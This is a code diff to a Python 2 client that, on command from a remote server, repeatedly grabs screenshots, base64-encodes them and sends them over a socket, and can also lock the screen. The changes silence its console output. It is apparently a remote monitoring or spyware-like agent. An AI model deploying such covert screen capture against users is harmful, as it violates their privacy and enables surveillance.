@@ -12,7 +12,7 @@ import datetime
 
 global userid
 
-DEBUG = 1
+DEBUG = 0
 
 def log(msg):
 	if DEBUG:
@@ -35,12 +35,13 @@ def snap_handler(userid):
 	image_date = image_timestamp.split('T')[0]
 	image_hour = image_timestamp.split('T')[1].split(":")[0]
 	image_minute = image_timestamp.split('T')[1].split(":")[1]
-	for i in xrange(100):
+	print datetime.datetime.now().isoformat()
+	for i in xrange(1000):
 		log('Getting snap num {0}'.format(i))
 		snapshot = ImageGrab.grab() # TODO Lower quality
 		save_path = "C:\\Users\\user\\MySnapshot.jpg"
 		snapshot.save(save_path)
-		log('got snap, snapid: ' + snapid)
+		log('got snap, snapid: ' + str(snapid))
 		# Send
 		f = open(save_path, 'rb')
 
@@ -51,9 +52,11 @@ def snap_handler(userid):
 				log('breaking')
 				break
 			encoded_data = base64.b64encode(raw_data)
-			msg = "{0},{1},{2},{3},{4},{5}".format(userid, image_date, image_hour, image_minute, snapid, encoded_data)
+			msg = "{0},{1},{2},{3},{4},{5}".format(userid, image_date, image_hour, image_minute, snapid, len(encoded_data))
 			s.send(msg)
 			time.sleep(0.1)
+			s.send(encoded_data)
+			#time.sleep(0.1)
 			log('Sent snap')
 
 		# finish, remove the file
@@ -70,6 +73,8 @@ def snap_handler(userid):
 			snapid = 0
 		else:
 			snapid += 1
+
+	print datetime.datetime.now().isoformat()
 
 
 
@@ -88,13 +93,13 @@ def main():
 		# TODO maybe dynamic way to consider sleeping time
 		time.sleep(5)
 		req = s.recv(1024)
-		print 'Do request: ' + req
+		log('Do request: ' + req)
 		if req == 'snap':
 			threading.Thread(target=snap_handler, args=(userid,)).start()
 		if req == 'lockscreen':
 			lockscreen_handler()
 		elif req == 'nojobs':
-			print 'no jobs for me!'
+			log('no jobs for me!')
 
 if __name__ == '__main__':
 	main()
